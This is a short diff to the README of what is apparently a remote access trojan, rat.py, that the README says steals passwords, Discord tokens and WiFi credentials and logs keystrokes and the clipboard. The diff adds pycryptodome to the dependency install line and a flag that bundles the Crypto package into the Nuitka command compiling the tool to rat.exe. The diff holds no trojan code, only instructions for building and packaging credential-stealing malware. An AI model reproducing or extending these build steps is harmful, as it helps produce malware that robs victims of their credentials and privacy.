@@ -36,7 +36,7 @@ Supports password stealing, Discord tokens, WiFi credentials, keylogger, clipboa
 ## Install dependencies
 
 ```bash
-pip install pyTelegramBotAPI pynput mss opencv-python requests psutil pywin32
+pip install pyTelegramBotAPI pynput mss opencv-python requests psutil pywin32 pycryptodome
 pip install nuitka ordered-set zstandard
 ```
 
@@ -77,6 +77,7 @@ nuitka ^
   --enable-plugin=anti-bloat ^
   --assume-yes-for-downloads ^
   --remove-output ^
+  --include-package=Crypto ^
   rat.py
 ```
 Output: rat.exe
